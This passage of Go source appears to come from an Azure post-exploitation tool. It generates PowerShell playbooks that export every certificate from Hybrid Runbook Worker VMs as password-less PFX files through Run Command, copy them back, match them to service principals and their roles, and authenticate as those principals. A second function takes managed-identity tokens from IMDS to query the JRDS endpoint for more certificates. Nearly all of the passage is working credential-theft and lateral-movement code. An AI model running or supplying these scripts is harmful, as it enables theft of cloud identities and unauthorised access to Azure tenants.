	template += fmt.Sprintf("$vmName = \"%s\"\n\n", vm.VMName)

	template += "# Set subscription context\n"
	template += "Set-AzContext -Subscription $subscriptionID\n\n"

	template += "# Define certificate extraction script\n"
	template += "$scriptContent = @'\n"
	template += "$certList = @()\n"
	template += "$certs = Get-ChildItem cert:\\localMachine\\my\n"
	template += "foreach ($cert in $certs) {\n"
	template += "    $certName = ($cert.Subject -split ',')[0].split('=')[1]\n"
	template += "    $certFilePath = \"C:\\Temp\\$certName.pfx\"\n"
	template += "    \n"
	template += "    # Create temp directory if it doesn't exist\n"
	template += "    if (-not (Test-Path C:\\Temp)) {\n"
	template += "        New-Item -ItemType Directory -Path C:\\Temp -Force | Out-Null\n"
	template += "    }\n"
	template += "    \n"
	template += "    # Export certificate without password\n"
	template += "    Export-PfxCertificate -Cert $cert -FilePath $certFilePath -Password (ConvertTo-SecureString -String \"\" -Force -AsPlainText) | Out-Null\n"
	template += "    \n"
	template += "    # Read and encode certificate\n"
	template += "    $certBytes = [System.IO.File]::ReadAllBytes($certFilePath)\n"
	template += "    $certBase64 = [Convert]::ToBase64String($certBytes)\n"
	template += "    \n"
	template += "    # Create object with cert info\n"
	template += "    $certInfo = [PSCustomObject]@{\n"
	template += "        Subject = $cert.Subject\n"
	template += "        Thumbprint = $cert.Thumbprint\n"
	template += "        NotAfter = $cert.NotAfter\n"
	template += "        CertificateBase64 = $certBase64\n"
	template += "    }\n"
	template += "    \n"
	template += "    $certList += $certInfo\n"
	template += "    \n"
	template += "    # Clean up temp file\n"
	template += "    Remove-Item $certFilePath -Force\n"
	template += "}\n\n"
	template += "# Output as JSON\n"
	template += "$certList | ConvertTo-Json -Depth 3\n"
	template += "'@\n\n"

	template += "# Execute via Run Command\n"
	template += "$result = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroup -VMName $vmName -CommandId 'RunPowerShellScript' -ScriptString $scriptContent\n\n"

	template += "# Parse results\n"
	template += "$outputLines = $result.Value[0].Message -split \"`n\"\n"
	template += "$jsonStart = $false\n"
	template += "$jsonContent = \"\"\n"
	template += "foreach ($line in $outputLines) {\n"
	template += "    if ($line -match \"^\\[\" -or $jsonStart) {\n"
	template += "        $jsonStart = $true\n"
	template += "        $jsonContent += $line + \"`n\"\n"
	template += "    }\n"
	template += "}\n\n"

	template += "$certificates = $jsonContent | ConvertFrom-Json\n\n"

	template += "# Save certificates to local disk\n"
	template += "foreach ($cert in $certificates) {\n"
	template += "    $certBytes = [Convert]::FromBase64String($cert.CertificateBase64)\n"
	template += "    $certFileName = \"HybridWorker_\" + $cert.Thumbprint + \".pfx\"\n"
	template += "    [System.IO.File]::WriteAllBytes($certFileName, $certBytes)\n"
	template += "    \n"
	template += "    Write-Host \"Saved certificate: $certFileName\"\n"
	template += "    Write-Host \"  Subject: $($cert.Subject)\"\n"
	template += "    Write-Host \"  Thumbprint: $($cert.Thumbprint)\"\n"
	template += "    Write-Host \"  Expires: $($cert.NotAfter)\"\n"
	template += "    Write-Host \"\"\n"
	template += "}\n"
	template += "```\n\n"

	template += "## Step 2: Match Certificates to Service Principals\n\n"
	template += "```powershell\n"
	template += "# For each extracted certificate, find matching App Registration\n"
	template += "foreach ($cert in $certificates) {\n"
	template += "    Write-Host \"Searching for App Registration with thumbprint: $($cert.Thumbprint)\"\n"
	template += "    \n"
	template += "    # Search for service principal with matching certificate\n"
	template += "    $sp = Get-AzADServicePrincipal | Where-Object {\n"
	template += "        $_.KeyCredentials.CustomKeyIdentifier -eq $cert.Thumbprint\n"
	template += "    }\n"
	template += "    \n"
	template += "    if ($sp) {\n"
	template += "        Write-Host \"  Found Service Principal: $($sp.DisplayName)\"\n"
	template += "        Write-Host \"  Application ID: $($sp.AppId)\"\n"
	template += "        Write-Host \"  Object ID: $($sp.Id)\"\n"
	template += "        \n"
	template += "        # Check role assignments\n"
	template += "        $roles = Get-AzRoleAssignment -ObjectId $sp.Id\n"
	template += "        if ($roles) {\n"
	template += "            Write-Host \"  Role Assignments:\"\n"
	template += "            foreach ($role in $roles) {\n"
	template += "                Write-Host \"    - $($role.RoleDefinitionName) on $($role.Scope)\"\n"
	template += "            }\n"
	template += "        }\n"
	template += "    } else {\n"
	template += "        Write-Host \"  No matching Service Principal found\"\n"
	template += "    }\n"
	template += "    Write-Host \"\"\n"
	template += "}\n"
	template += "```\n\n"

	template += "## Step 3: Authenticate with Extracted Certificate\n\n"
	template += "```powershell\n"
	template += "# Example authentication using extracted certificate\n"
	template += "# Replace with actual values from Step 2\n\n"
	template += "$certPath = \"HybridWorker_<THUMBPRINT>.pfx\"  # Replace with actual filename\n"
	template += "$appId = \"<APPLICATION_ID>\"  # From Step 2\n"
	template += fmt.Sprintf("$tenantId = \"<TENANT_ID>\"  # Get from VM identity or subscription\n\n")

	template += "# Import certificate to local store\n"
	template += "$certPassword = ConvertTo-SecureString -String \"\" -Force -AsPlainText\n"
	template += "Import-PfxCertificate -FilePath $certPath -CertStoreLocation Cert:\\CurrentUser\\My -Password $certPassword\n\n"

	template += "# Get certificate thumbprint\n"
	template += "$cert = Get-PfxCertificate -FilePath $certPath\n"
	template += "$thumbprint = $cert.Thumbprint\n\n"

	template += "# Authenticate\n"
	template += "Connect-AzAccount -ServicePrincipal -ApplicationId $appId -CertificateThumbprint $thumbprint -Tenant $tenantId\n\n"

	template += "# Verify access\n"
	template += "Get-AzContext\n"
	template += "Get-AzSubscription\n"
	template += "```\n\n"

	return template
}

// GenerateJRDSExtractionScript creates a script to extract additional certificates via JRDS endpoint
func GenerateJRDSExtractionScript(vm HybridWorkerVM) string {
	template := fmt.Sprintf("# JRDS Certificate Extraction Script\n")
	template += fmt.Sprintf("# VM: %s\n", vm.VMName)
	template += fmt.Sprintf("# Resource Group: %s\n\n", vm.ResourceGroup)

	if !vm.HasManagedIdentity {
		template += "# WARNING: This VM does not have a managed identity configured\n"
		template += "# JRDS extraction requires managed identity to obtain IMDS token\n\n"
		return template
	}

	if vm.OSType != "Windows" {
		template += "# WARNING: This script is designed for Windows Hybrid Workers\n"
		template += "# Linux workers may have different registry paths and JRDS configurations\n\n"
		return template
	}

	template += "## Overview\n"
	template += "# The JRDS (Job Runtime Data Service) endpoint can expose additional certificates\n"
	template += "# This script extracts JRDS configuration and retrieves certificates via managed identity\n\n"

	template += "## Step 1: Extract JRDS Configuration from Registry\n\n"
	template += "```powershell\n"
	template += "# Set variables\n"
	template += fmt.Sprintf("$subscriptionID = \"%s\"\n", vm.SubscriptionID)
	template += fmt.Sprintf("$resourceGroup = \"%s\"\n", vm.ResourceGroup)
	template += fmt.Sprintf("$vmName = \"%s\"\n\n", vm.VMName)

	template += "# Define JRDS configuration extraction script\n"
	template += "$jrdsScript = @'\n"
	template += "$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\HybridRunbookWorkerV2\"\n\n"

	template += "if (Test-Path $registryPath) {\n"
	template += "    $config = Get-ItemProperty -Path $registryPath\n"
	template += "    \n"
	template += "    $jrdsInfo = [PSCustomObject]@{\n"
	template += "        AutomationAccountUrl = $config.AutomationHybridServiceUrl\n"
	template += "        WorkerGroupName = $config.WorkerGroupName\n"
	template += "        WorkerName = $config.WorkerName\n"
	template += "    }\n"
	template += "    \n"
	template += "    # Get IMDS token for managed identity\n"
	template += "    $response = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata=\"true\"} -UseBasicParsing\n"
	template += "    $token = ($response.Content | ConvertFrom-Json).access_token\n"
	template += "    \n"
	template += "    # Try to call JRDS endpoint to get automation account certs\n"
	template += "    # Note: JRDS URL format varies, this is an example\n"
	template += "    $jrdsUrl = $config.AutomationHybridServiceUrl + \"/certificates\"\n"
	template += "    \n"
	template += "    try {\n"
	template += "        $certsResponse = Invoke-WebRequest -Uri $jrdsUrl -Headers @{Authorization=\"Bearer $token\"} -UseBasicParsing\n"
	template += "        $jrdsInfo | Add-Member -MemberType NoteProperty -Name \"Certificates\" -Value $certsResponse.Content\n"
	template += "    } catch {\n"
	template += "        $jrdsInfo | Add-Member -MemberType NoteProperty -Name \"Error\" -Value $_.Exception.Message\n"
	template += "    }\n"
	template += "    \n"
	template += "    $jrdsInfo | ConvertTo-Json -Depth 3\n"
	template += "} else {\n"
	template += "    Write-Output \"JRDS configuration not found in registry\"\n"
	template += "}\n"
	template += "'@\n\n"

	template += "# Execute via Run Command\n"
	template += "Set-AzContext -Subscription $subscriptionID\n"
	template += "$result = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroup -VMName $vmName -CommandId 'RunPowerShellScript' -ScriptString $jrdsScript\n\n"

	template += "# Display results\n"
	template += "$result.Value[0].Message\n"
	template += "```\n\n"

	template += "## Step 2: Alternative - Direct JRDS Access via Managed Identity\n\n"
	template += "```powershell\n"
	template += "# If you have already extracted the JRDS URL, you can query it directly\n"
	template += "# using the VM's managed identity token\n\n"

	if vm.HasManagedIdentity {
		template += fmt.Sprintf("# This VM has a managed identity: %s\n", vm.IdentityType)
		template += fmt.Sprintf("# Principal ID: %s\n\n", vm.PrincipalID)

		template += "# Get managed identity token\n"
		template += fmt.Sprintf("$vmIdentity = Get-AzVM -ResourceGroupName \"%s\" -Name \"%s\"\n", vm.ResourceGroup, vm.VMName)
		template += "$tokenEndpoint = \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"\n\n"

		template += "# Note: This would need to be run FROM the VM itself to access IMDS\n"
		template += "# $response = Invoke-RestMethod -Uri $tokenEndpoint -Method GET -Headers @{Metadata=\"true\"}\n"
		template += "# $token = $response.access_token\n\n"

		template += "# Then use token to query JRDS endpoint (URL from registry extraction)\n"
		template += "# $jrdsUrl = \"https://<automation-account-url>/certificates\"\n"
		template += "# $certs = Invoke-RestMethod -Uri $jrdsUrl -Headers @{Authorization=\"Bearer $token\"}\n"
	}

	template += "```\n\n"

	template += "## Notes\n"
	template += "# - JRDS endpoint URLs vary by region and automation account configuration\n"
	template += "# - The managed identity must have appropriate permissions to access JRDS\n"
	template += "# - Some certificates may be encrypted or protected\n"
	template += "# - Always verify certificate permissions and intended use before authentication\n\n"

	return template
}
